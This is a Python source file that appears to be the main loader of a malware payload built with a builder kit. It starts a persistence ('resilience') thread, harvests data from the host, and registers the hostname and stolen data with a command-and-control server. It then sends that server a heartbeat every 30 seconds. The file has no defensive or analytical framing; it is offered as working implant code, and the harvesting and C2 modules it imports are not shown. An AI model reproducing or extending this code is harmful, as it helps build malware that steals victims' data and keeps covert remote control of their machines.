import time
import threading
import socket
import traceback  # Import the traceback module

# --- We will import these inside the main function to catch import errors ---
# from harvester import harvest_all_data
# from resilience import manage_resilience
# from comms import register_with_c2, send_heartbeat

# --- CONFIGURATION (Builder will set this) ---
ENABLE_RESILIENCE = True

def main():
    """Main execution flow for the payload."""
    print("[*] Main function started.")

    # --- Import modules inside the function to catch potential ModuleNotFoundErrors ---
    print("[*] Importing core modules...")
    from harvester import harvest_all_data
    from comms import register_with_c2, send_heartbeat
    print("[*] Core modules imported successfully.")

    if ENABLE_RESILIENCE:
        print("[*] Resilience is enabled. Importing and starting resilience thread...")
        from resilience import manage_resilience
        resilience_thread = threading.Thread(target=manage_resilience, daemon=True)
        resilience_thread.start()
        print("[*] Resilience thread started.")
    else:
        print("[*] Resilience is disabled.")


    # Initial data harvest and registration
    print("[*] Starting data harvest...")
    harvested_data = harvest_all_data()
    print("[*] Data harvest complete.")

    print("[*] Getting hostname...")
    hostname = socket.gethostname()
    print(f"[*] Hostname found: {hostname}")

    print("[*] Registering with C2 server...")
    register_with_c2(hostname, harvested_data)
    print("[*] Registration attempt finished.")

    # Main loop for heartbeats
    print("[*] Entering main heartbeat loop...")
    while True:
        send_heartbeat()
        print(f"[*] Heartbeat sent. Sleeping for 30 seconds.")
        time.sleep(30)

if __name__ == "__main__":
    # This is our master "safety net" to catch ANY error during startup or runtime.
    try:
        print("--------------------------------------------------")
        print("[*] Payload script entry point reached.")
        main()

    except Exception as e:
        # If ANY error occurs, it will be caught here.
        print("\n" * 3)
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print("!!!   A CRITICAL AND UNEXPECTED ERROR OCCURRED   !!!")
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print(f"\n[ERROR TYPE]: {type(e).__name__}")
        print(f"[ERROR DETAILS]: {e}")
        print("\n[FULL TRACEBACK]:")
        # traceback.print_exc() prints the detailed error report.
        traceback.print_exc()

    finally:
        # This code will run NO MATTER WHAT, ensuring the window stays open.
        print("\n--------------------------------------------------")
        print("[*] Script has finished or crashed.")
        input("    Press Enter to exit...")